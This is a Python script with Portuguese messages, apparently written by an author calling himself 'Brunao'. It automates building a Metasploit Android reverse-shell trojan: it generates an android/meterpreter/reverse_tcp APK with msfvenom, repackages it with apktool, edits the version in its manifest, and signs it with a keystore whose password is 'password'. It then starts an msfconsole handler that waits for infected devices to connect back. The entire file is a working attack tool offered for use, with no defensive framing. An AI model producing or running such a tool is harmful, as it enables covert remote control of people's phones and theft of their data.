import subprocess
import sys
import re
import time
import os
import shutil

def loading(message):
    """Função de carregamento que simula progresso com um texto"""
    print(f"[*] {message}", end=" ", flush=True)
    for _ in range(3):
        time.sleep(1)
        print(".", end="", flush=True)
    print(" Concluído!")

def check_dependencies():
    """Verifica se as dependências necessárias estão instaladas."""
    dependencies = ['msfvenom', 'apktool', 'jarsigner', 'zipalign', 'msfconsole', 'keytool']
    missing_dependencies = []

    for dep in dependencies:
        if subprocess.run(f'which {dep}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
            missing_dependencies.append(dep)

    if missing_dependencies:
        print(f"[!] As seguintes dependências estão faltando: {', '.join(missing_dependencies)}")
        print("[!] Certifique-se de que o Metasploit, apktool, jarsigner, zipalign, msfconsole e keytool estão instalados.")
        sys.exit(1)

def get_local_ip():
    """Obtém o IP local da máquina"""
    result = subprocess.run("ip a", shell=True, capture_output=True, text=True)
    ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
    match = ip_pattern.search(result.stdout)
    return match.group(1) if match else '127.0.0.1'

def update_metasploit():
    """Atualiza o Metasploit Framework"""
    loading("Atualizando o Metasploit Framework...")
    try:
        subprocess.run(['msfupdate'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao atualizar o Metasploit: {e}")
        sys.exit(1)

def generate_payload(ip, port):
    """Gera um payload usando o msfvenom"""
    payload_name = "brunao_kyti.apk"
    loading(f"Gerando o payload {payload_name}...")
    try:
        subprocess.run([
            'msfvenom', '-p', 'android/meterpreter/reverse_tcp', f'LHOST={ip}', f'LPORT={port}', '-o', payload_name
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao gerar o payload: {e}")
        sys.exit(1)
    return payload_name

def force_remove_dir(path):
    """Força a remoção de um diretório, mesmo se houver erros de permissão."""
    try:
        shutil.rmtree(path)
        print(f"[+] Diretório {path} removido com sucesso!")
    except PermissionError:
        print(f"[!] Erro de permissão ao tentar remover o diretório {path}. Tentando com sudo...")
        # Tenta executar o comando com sudo
        subprocess.run(f"sudo rm -rf {path}", shell=True, check=True)
        print(f"[+] Diretório {path} removido com sucesso!")
    except Exception as e:
        print(f"[!] Erro ao remover o diretório {path}: {e}")
        sys.exit(1)

def decompile_apk(payload_name):
    """Descompila o APK gerado com o apktool, removendo o diretório de destino, se necessário"""
    loading(f"Descompilando o APK {payload_name}...")
    
    destination_dir = "brunao_kyti"
    
    # Se o diretório de destino já existir, apaga-o
    if os.path.exists(destination_dir):
        print(f"[!] O diretório {destination_dir} já existe. Removendo...")
        force_remove_dir(destination_dir)
    
    try:
        subprocess.run(['apktool', 'd', payload_name], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao descompilar o APK: {e}")
        sys.exit(1)

def update_version_in_manifest():
    """Atualiza a versão no AndroidManifest.xml"""
    loading("Atualizando a versão no AndroidManifest.xml...")
    try:
        with open("brunao_kyti/AndroidManifest.xml", 'r') as file:
            content = file.read()
        content = content.replace('android:versionCode="1"', 'android:versionCode="100"')
        content = content.replace('android:versionName="1.0"', 'android:versionName="1.0.0"')
        with open("brunao_kyti/AndroidManifest.xml", 'w') as file:
            file.write(content)
    except Exception as e:
        print(f"[!] Erro ao atualizar o AndroidManifest.xml: {e}")
        sys.exit(1)

def recompile_apk():
    """Recompila o APK usando apktool"""
    loading("Recompilando o APK...")
    try:
        subprocess.run(['apktool', 'b', 'brunao_kyti', '-o', 'Brunao_kyti_signed.apk'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao recompilar o APK: {e}")
        sys.exit(1)

def generate_keystore():
    """Gera um keystore se ele não existir."""
    keystore_path = os.path.expanduser('~/Documentos/my-release-key.keystore')

    if not os.path.exists(keystore_path):
        loading("Gerando o keystore...")
        try:
            # Gera o keystore com uma senha de exemplo (altere conforme necessário)
            subprocess.run([
                'keytool', '-genkey', '-v', '-keystore', keystore_path, '-keyalg', 'RSA', '-keysize', '2048', 
                '-validity', '10000', '-alias', 'keyalias', '-storepass', 'password', '-keypass', 'password'
            ], check=True)
            print(f"[*] Keystore gerado em: {keystore_path}")
        except subprocess.CalledProcessError as e:
            print(f"[!] Erro ao gerar o keystore: {e}")
            sys.exit(1)
    else:
        print(f"[*] Keystore encontrado em: {keystore_path}")
    return keystore_path

def sign_apk(keystore_path):
    """Assina o APK com o keystore gerado ou existente"""
    loading("Assinando o APK")
    try:
        # Assinando o APK com o keystore gerado ou encontrado
        subprocess.run(['jarsigner', '-verbose', '-keystore', keystore_path, 'Brunao_kyti_signed.apk', 'keyalias'], check=True)
        subprocess.run(['zipalign', '-v', '4', 'Brunao_kyti_signed.apk', 'Brunao_kyti_final.apk'], check=True)
        print("[*] APK assinado e otimizado com sucesso.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao assinar o APK: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Erro: {e}")
        sys.exit(1)

def start_meterpreter(ip, port):
    """Inicia o listener do Meterpreter"""
    loading("Iniciando o listener do Meterpreter...")
    try:
        subprocess.run(['msfconsole', '-x', f'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao iniciar o listener do Meterpreter: {e}")
        sys.exit(1)

def main():
    print("Olá, meu nome é Brunao. Este script irá:")
    print("- Atualizar o Metasploit Framework")
    print("- Gerar um payload para Android")
    print("- Descompilar o APK gerado")
    print("- Atualizar a versão do APK para Android 13")
    print("- Recompilar, assinar e otimizar o APK gerado")
    print("- Iniciar o listener do Meterpreter")
    
    # Aguarda o comando -r para iniciar a execução
    if len(sys.argv) < 2 or sys.argv[1] != '-r':
        print("[!] Comando -r necessário para iniciar a execução.")
        sys.exit(1)

    # Verifica se todas as dependências estão instaladas
    check_dependencies()

    ip = get_local_ip()  # Obtém o IP local da máquina via ip a
    print(f"[*] IP local detectado: {ip}")
    port = input("[*] Digite a porta de destino (LPORT): ")

    # Processo de atualização e geração do APK
    update_metasploit()
    payload_name = generate_payload(ip, port)
    decompile_apk(payload_name)
    update_version_in_manifest()
    recompile_apk()

    # Gera o keystore e assina o APK
    keystore_path = generate_keystore()
    sign_apk(keystore_path)

    # Inicia o Meterpreter
    start_meterpreter(ip, port)

    print("[*] Processo concluído com sucesso!")
    print("[*] APK final: Brunao_kyti_final.apk")

if __name__ == "__main__":
    main()
